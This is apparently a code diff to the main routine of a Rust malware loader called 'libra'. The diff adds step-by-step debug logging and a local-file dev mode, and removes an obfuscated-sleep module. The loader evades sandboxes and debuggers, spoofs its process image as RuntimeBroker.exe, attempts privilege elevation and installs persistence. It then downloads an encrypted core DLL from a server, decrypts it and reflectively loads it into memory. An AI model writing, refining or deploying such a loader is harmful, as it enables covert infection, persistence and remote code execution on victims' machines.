@@ -2,153 +2,187 @@ mod config;
 mod dll_fetch;
 mod elevation;
 mod pe_loader;
-mod sleep_obfuscation;
 
 use config::LoaderConfig;
 use std::env;
 
+macro_rules! log {
+    ($($arg:tt)*) => {
+        eprintln!($($arg)*);
+        let _ = std::io::Write::flush(&mut std::io::stderr());
+    };
+}
+
 fn main() {
+    log!("[1/10] main() entered");
+
     let args: Vec<String> = env::args().collect();
     let is_boot = args.iter().any(|a| a == "--boot");
+    log!("[2/10] args parsed, is_boot={}", is_boot);
 
     // 1. Parse injected config from binary
+    log!("[3/10] parsing injected config...");
     let (injected, raw_json) = match parse_injected_config() {
-        Some((cfg, json)) => (cfg, json),
+        Some((cfg, json)) => {
+            log!("[3/10] config OK ({} bytes)", json.len());
+            (cfg, json)
+        }
         None => {
-            fatal_exit("[!] Config parse failed — no LIBRA_CFG_BLOCK! magic found");
+            fatal_exit("[3/10] FAIL: no LIBRA_CFG_BLOCK! magic found");
         }
     };
 
     let loader_cfg = LoaderConfig::from_injected(injected, raw_json);
+    log!("[3/10] LoaderConfig created, server={}", loader_cfg.server_url);
 
-    // 2. Anti-analysis: sandbox + debugger detection (BEFORE any persistence/IOCs)
-    //    Skip uptime check on boot to avoid self-kill on autostart
+    // 2. Anti-analysis
+    log!("[4/10] anti_analysis.enabled={}", loader_cfg.anti_analysis.enabled);
     if loader_cfg.anti_analysis.enabled {
+        log!("[4/10] running sandbox checks...");
         if is_sandbox(&loader_cfg.anti_analysis, is_boot)
             || (loader_cfg.anti_analysis.check_debugger && check_debugger())
         {
-            // In sandbox/debugger: execute benign behavior then exit cleanly
+            log!("[4/10] sandbox/debugger detected — sleeping forever");
             std::thread::sleep(std::time::Duration::from_secs(u64::MAX));
             std::process::exit(0);
         }
+        log!("[4/10] sandbox checks passed");
+    } else {
+        log!("[4/10] anti-analysis disabled, skipping");
     }
 
-    // 3. PEB spoofing — mask image path BEFORE any external calls
+    // 3. PEB spoofing
+    log!("[5/10] spoof_peb...");
     elevation::spoof_peb("C:\\Windows\\System32\\RuntimeBroker.exe");
+    log!("[5/10] spoof_peb done");
 
-    // 4. Elevation attempt (only if config requires admin)
+    // 4. Elevation
     if loader_cfg.require_admin {
+        log!("[6/10] require_admin=true, trying elevation...");
         let exe = env::current_exe()
             .map(|p| p.to_string_lossy().to_string())
             .unwrap_or_default();
         if !exe.is_empty() {
-            let _ = elevation::try_elevate(&exe);
+            match elevation::try_elevate(&exe) {
+                Ok(true) => {
+                    log!("[6/10] elevated process spawned, exiting current");
+                    std::process::exit(0);
+                }
+                Ok(false) => {
+                    log!("[6/10] already admin, continuing");
+                }
+                Err(_) => {
+                    log!("[6/10] elevation failed, continuing without admin");
+                }
+            }
         }
-        // Degrade gracefully if elevation fails
+    } else {
+        log!("[6/10] require_admin=false, skipping");
     }
 
-    // 5. Persistence (only after confirming we're not in a sandbox)
+    // 5. Persistence
     if let Some(path) = loader_cfg.copy_to_path.as_deref() {
         if !path.is_empty() {
+            log!("[7/10] copy_to_path={}, relaunching...", path);
             copy_and_relaunch(path);
         }
     }
     if loader_cfg.enable_persistence {
+        log!("[7/10] installing persistence...");
         install_persistence();
     }
+    log!("[7/10] persistence done");
 
-    // 6. Decrypt AES key
-    let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
-        Ok(k) => k,
-        Err(e) => {
-            fatal_exit(&format!("[!] AES key decrypt failed: {}", e));
-        }
-    };
-
-    // 7. Download and decrypt core DLL
-    let download_url = loader_cfg.download_url();
-
-    let rt = match tokio::runtime::Builder::new_current_thread()
-        .enable_all()
-        .build()
-    {
-        Ok(rt) => rt,
-        Err(e) => {
-            fatal_exit(&format!("[!] Tokio runtime error: {}", e));
-        }
-    };
-
-    let dll_bytes = match rt.block_on(dll_fetch::download_core(&download_url)) {
-        Ok(encrypted) => {
-            match dll_fetch::decrypt_dll(&encrypted, &aes_key) {
-                Ok(decrypted) => decrypted,
-                Err(e) => {
-                    fatal_exit(&format!("[!] DLL decrypt failed: {}", e));
-                }
+    // 6. Load core DLL bytes
+    let dll_bytes = if let Some(local_path) = args.iter().position(|a| a == "--local").and_then(|i| args.get(i + 1)) {
+        // Dev mode: load core.dll directly from disk (skip download + decrypt)
+        log!("[8/10] --local mode: loading from {}", local_path);
+        match std::fs::read(local_path) {
+            Ok(bytes) => {
+                log!("[9/10] local load OK ({} bytes)", bytes.len());
+                bytes
             }
+            Err(e) => fatal_exit(&format!("[8/10] FAIL: read {}: {}", local_path, e)),
         }
-        Err(e) => {
-            fatal_exit(&format!("[!] Download failed ({}): {}", download_url, e));
-        }
+    } else {
+        // Production: decrypt AES key, download, decrypt core DLL
+        log!("[8/10] decrypting AES key...");
+        let mut aes_key = match dll_fetch::decrypt_aes_key(&loader_cfg.encrypted_aes_key, &loader_cfg.rsa_private_key) {
+            Ok(k) => {
+                log!("[8/10] AES key decrypted OK ({} bytes)", k.len());
+                k
+            }
+            Err(e) => fatal_exit(&format!("[8/10] FAIL: AES key decrypt: {}", e)),
+        };
+
+        let download_url = loader_cfg.download_url();
+        log!("[9/10] downloading core from {}...", download_url);
+
+        let aes_key_clone = aes_key.clone();
+        let download_result = std::thread::spawn(move || {
+            let rt = tokio::runtime::Builder::new_current_thread()
+                .enable_all()
+                .build()
+                .map_err(|e| format!("tokio runtime: {}", e))?;
+
+            let encrypted = rt.block_on(dll_fetch::download_core(&download_url))
+                .map_err(|e| format!("download: {}", e))?;
+
+            let decrypted = dll_fetch::decrypt_dll(&encrypted, &aes_key_clone)
+                .map_err(|e| format!("decrypt: {}", e))?;
+
+            Ok::<(Vec<u8>, usize), String>((decrypted, encrypted.len()))
+        }).join().unwrap_or(Err("download thread panic".into()));
+
+        let bytes = match download_result {
+            Ok((decrypted, enc_len)) => {
+                log!("[9/10] download OK ({} bytes), decrypt OK ({} bytes)", enc_len, decrypted.len());
+                decrypted
+            }
+            Err(e) => fatal_exit(&format!("[9/10] FAIL: {}", e)),
+        };
+
+        use zeroize::Zeroize;
+        aes_key.zeroize();
+        bytes
     };
 
-    // 8. Zeroize AES key from memory (prevents LLVM from optimizing away the wipe)
-    use zeroize::Zeroize;
-    aes_key.zeroize();
-
-    // 9. Validate PE/ELF header
-    if dll_bytes.len() < 2 {
-        fatal_exit("[!] DLL too small — no header");
+    // 9. Validate PE header (basic sanity check)
+    if dll_bytes.len() < 64 {
+        fatal_exit("[9/10] FAIL: payload too small");
     }
-
     #[cfg(target_os = "windows")]
     if dll_bytes[0] != 0x4D || dll_bytes[1] != 0x5A {
-        fatal_exit("[!] Not a valid PE (MZ header missing)");
+        fatal_exit("[9/10] FAIL: not a valid PE (MZ missing)");
     }
+    log!("[9/10] PE validated ({} bytes)", dll_bytes.len());
 
-    #[cfg(target_os = "linux")]
-    if dll_bytes[0] != 0x7F || dll_bytes[1] != 0x45 {
-        fatal_exit("[!] Not a valid ELF header");
-    }
-
-    // 10. Reflective load (Module Stomping: RW→memcpy→RX, never RWX)
+    // 10. Reflective load
+    log!("[10/10] reflective_load...");
     let entry_fn = match unsafe { pe_loader::reflective_load(&dll_bytes) } {
-        Ok(f) => f,
+        Ok(f) => {
+            log!("[10/10] reflective_load OK");
+            f
+        }
         Err(e) => {
-            fatal_exit(&format!("[!] Reflective load failed: {}", e));
+            fatal_exit(&format!("[10/10] FAIL: reflective_load: {}", e));
         }
     };
 
-    // 11. Call entry point with config JSON
+    // 11. Call core_main — should never return
     let config_bytes = loader_cfg.config_json.as_bytes();
-
-    // 12. Obfuscated sleep (random 1-5s delay, encrypts sensitive data via isolated thread)
-    {
-        // Register config JSON for sleep-time encryption
-        unsafe {
-            sleep_obfuscation::register_region(
-                config_bytes.as_ptr() as *mut u8,
-                config_bytes.len(),
-            );
-        }
-        let delay_ms = 1000 + (rand::random::<u64>() % 4000);
-        sleep_obfuscation::obfuscated_sleep(std::time::Duration::from_millis(delay_ms));
-    }
-
-    // 13. Call core_main
+    log!("[10/10] calling core_main ({} bytes config)...", config_bytes.len());
     entry_fn(config_bytes.as_ptr(), config_bytes.len());
 
-    // Should not return, but if it does:
+    // Should not reach here
+    log!("[10/10] core_main returned! exiting...");
     std::process::exit(0);
 }
 
 // ── Fatal exit with visible output ────────────────────────────────────
 
 fn fatal_exit(msg: &str) -> ! {
-    use std::io::Write;
-    let mut stderr = std::io::stderr();
-    let _ = writeln!(stderr, "{}", msg);
-    let _ = stderr.flush();
+    log!("{}", msg);
     std::thread::sleep(std::time::Duration::from_millis(100));
     std::process::exit(1);
 }
@@ -159,33 +193,42 @@ use libra_common::models::{AntiAnalysisConfig, InjectedConfig, CONFIG_MAGIC};
 
 fn parse_injected_config() -> Option<(InjectedConfig, String)> {
     let exe_path = env::current_exe().ok()?;
+    log!("  exe: {}", exe_path.display());
     let data = std::fs::read(&exe_path).ok()?;
+    log!("  read {} bytes", data.len());
 
     if data.len() < CONFIG_MAGIC.len() + 4 {
+        log!("  too small for config block");
         return None;
     }
 
     let magic_pos = data
         .windows(CONFIG_MAGIC.len())
         .rposition(|w| w == CONFIG_MAGIC.as_slice())?;
+    log!("  magic at offset 0x{:X}", magic_pos);
 
     let pos = magic_pos + CONFIG_MAGIC.len();
     if pos + 4 > data.len() {
+        log!("  no length after magic");
         return None;
     }
 
     let len_bytes: [u8; 4] = data[pos..pos + 4].try_into().ok()?;
     let json_len = u32::from_le_bytes(len_bytes) as usize;
     let json_start = pos + 4;
+    log!("  json_len={}", json_len);
 
     if json_start + json_len > data.len() {
+        log!("  json extends past EOF");
         return None;
     }
 
     let json_bytes = &data[json_start..json_start + json_len];
     let json_str = std::str::from_utf8(json_bytes).ok()?;
-    let config: InjectedConfig = serde_json::from_str(json_str).ok()?;
+    log!("  json: {}", &json_str[..json_str.len().min(200)]);
 
+    let config: InjectedConfig = serde_json::from_str(json_str).ok()?;
+    log!("  deserialization OK");
     Some((config, json_str.to_string()))
 }
 
@@ -680,4 +723,3 @@ fn parse_wmi_datetime(s: &str) -> Result<u64, ()> {
         + (day - 1) as u64;
     Ok(days_since_epoch * 86400 + hour as u64 * 3600 + min as u64 * 60 + sec as u64)
 }
-
